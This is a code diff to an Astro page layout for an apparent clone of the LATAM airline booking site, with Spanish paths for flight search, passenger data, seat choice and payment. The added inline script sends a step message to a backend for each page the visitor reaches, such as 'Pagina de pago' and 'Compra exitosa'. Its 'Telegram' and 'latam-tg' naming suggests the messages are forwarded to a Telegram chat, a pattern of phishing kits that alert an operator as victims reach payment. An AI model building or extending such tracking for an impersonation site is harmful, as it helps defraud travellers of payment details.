@@ -53,40 +53,51 @@ src="https://www.facebook.com/tr?id=950663504721055&ev=PageView&noscript=1"
   </head>
   <body class={bodyClass}>
     <slot />
-    <script>
-      const PAGE_CODES = {
-        '/': 'P1',
-        '/reservar': 'P1',
-        '/buscar': 'P2',
-        '/ofertas-vuelos': 'P2',
-        '/resumen-viaje': 'P3',
-        '/pasajeros': 'P4',
-        '/datos-pasajero': 'P4',
-        '/seleccion-asientos': 'P4',
-        '/tienda': 'P4',
-        '/pagos': 'P-PAYMENT',
-        '/success': 'P-SUCCESS',
-      };
+    <script is:inline>
+      (function () {
+        window.__latamTgSent = window.__latamTgSent || {};
+        const PAGE_MESSAGES = {
+          '/': 'Buscando vuelos',
+          '/reservar': 'Buscando vuelos',
+          '/resumen-viaje': 'Viendo resumen de vuelos',
+          '/datos-pasajero': 'Viendo resumen de vuelos',
+          '/pasajeros': 'Datos de pasajero',
+          '/tienda': 'Escogiendo maletas',
+          '/pagos': 'Pagina de pago',
+          '/success': 'Compra exitosa',
+        };
 
-      function debugPageCode(pathname) {
-        const clean = pathname.replace(/\/+$/, '') || '/';
-        return PAGE_CODES[clean] || 'P1';
-      }
-
-      async function sendDebugPageView() {
-        const event = debugPageCode(window.location.pathname);
-        try {
-          await fetch('/api/debug-page', {
+        function sendTelegramStep(event) {
+          if (!event) return;
+          if (window.__latamTgSent[event]) return;
+          window.__latamTgSent[event] = true;
+          try {
+            const key = 'latam-tg:' + event;
+            if (sessionStorage.getItem(key)) return;
+            sessionStorage.setItem(key, '1');
+          } catch {
+            /* ignore */
+          }
+          fetch('/api/debug-page', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ event }),
-          });
-        } catch {
-          /* Debug telemetry is best-effort. */
+            body: JSON.stringify({ event: event }),
+            keepalive: true,
+          }).catch(function () {});
         }
-      }
 
-      sendDebugPageView();
+        function pageStep(pathname) {
+          const clean = pathname.replace(/\/+$/, '') || '/';
+          if (clean === '/prueba-telegram') return '';
+          if (clean === '/seleccion-asientos') return 'Escogiendo asiento ida';
+          return PAGE_MESSAGES[clean] || '';
+        }
+
+        window.sendTelegramStep = sendTelegramStep;
+        if (window.__latamTgPageBoot) return;
+        window.__latamTgPageBoot = true;
+        sendTelegramStep(pageStep(window.location.pathname));
+      })();
     </script>
   </body>
 </html>
